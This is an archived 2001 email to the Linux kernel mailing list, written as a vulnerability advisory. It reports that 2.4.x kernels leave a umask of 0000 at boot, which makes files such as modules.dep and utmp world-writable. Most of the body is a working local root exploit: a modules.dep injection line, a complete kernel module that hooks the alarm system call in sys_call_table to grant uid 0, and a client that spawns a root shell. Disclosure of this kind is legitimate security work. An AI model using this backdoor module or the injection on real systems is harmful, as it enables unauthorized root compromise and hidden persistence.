Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S266982AbRGMVS7>; Fri, 13 Jul 2001 17:18:59 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S267544AbRGMVSt>; Fri, 13 Jul 2001 17:18:49 -0400
Received: from shell1.pulltheplug.com ([209.9.44.200]:24846 "HELO
	dawoozie.pulltheplug.com") by vger.kernel.org with SMTP
	id <S266982AbRGMVSg>; Fri, 13 Jul 2001 17:18:36 -0400
Date: Fri, 13 Jul 2001 16:13:34 -0500 (EST)
From: <josh@pulltheplug.com>
To: <linux-kernel@vger.kernel.org>
Subject: umask 000 bug/difference
Message-ID: <Pine.LNX.4.33.0107131611520.22258-100000@shell.pulltheplug.com>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Submitted by  : Josh (josh@pulltheplug.com), lockdown
                (lockdown@lockeddown.net)
Vulnerability : /lib/modules/2.4.5/modules.dep
Tested On     : Slackware 8.0. 2.4.5
Local         : Yes
Remote        : No
Temporary Fix : umask 022 at the top of all your startup scripts
Target        : root
Big thanks to : slider, lamagra, zen-parse
Greets to     : alpha, fr3n3tic, omega, eazyass, remmy, RedPen, banned-it,
                cryptix, s0ttle, xphantom, qtip, Sultrix,
                falcon-networks.com.

	The 2.4.x kernels starting with 2.4.3 (i think) have, after
load, left a umask of 0000.  This forces any files created in the bootup
scripts, without the command `umask 022` issued to be world writeable.
In slackware, files include /var/run/utmp and /var/run/gpm.pid.  This same
vulnerability is responsible for creating /lib/modules/`uname -r`/modules.dep
world writeable.  With this file world writeable, all an intruder need do is
put something like the following in /lib/modules/`uname -r`/modules.dep
assuming the system's startup scripts modprobe lp:

/lib/modules/2.4.5/kernel/drivers/char/lp.o:  /tmp/alarm.o

/tmp/alarm.o:

where the alarm.o module is:

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/types.h>
#include <asm/segment.h>
#include <asm/unistd.h>
#include <linux/dirent.h>
#include <sys/syscall.h>
#include <sys/sysmacros.h>

#include <linux/sched.h>

#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/kernel.h>

extern void* sys_call_table[];

unsigned int (*old_alarm) (unsigned int seconds);
unsigned int hacked_alarm (unsigned int seconds);

unsigned int hacked_alarm(unsigned int seconds)
{
           if(seconds == 454) {
                current->uid = 0;
                current->euid = 0;
                current->gid = 0;
                current->egid = 0;
                return 0;
            }
   return old_alarm(seconds);
}

int init_module(void) {
 old_alarm=sys_call_table[SYS_alarm];
 sys_call_table[SYS_alarm] = hacked_alarm;
 return 0;
}

void cleanup_module(void) {
   sys_call_table[SYS_alarm] = old_alarm;
}

make a client:
#include <stdio.h>
#include <unistd.h>

int main(void)
{
  alarm(454);
  execl("/bin/sh", "sh", NULL);
}

which will, when the module is loaded, execute a shell as root.


	And of course with /var/run/utmp writeable, users can delete or in
other ways manipulate their logins as they appear in
w/who/finger/getlogin(), etc.



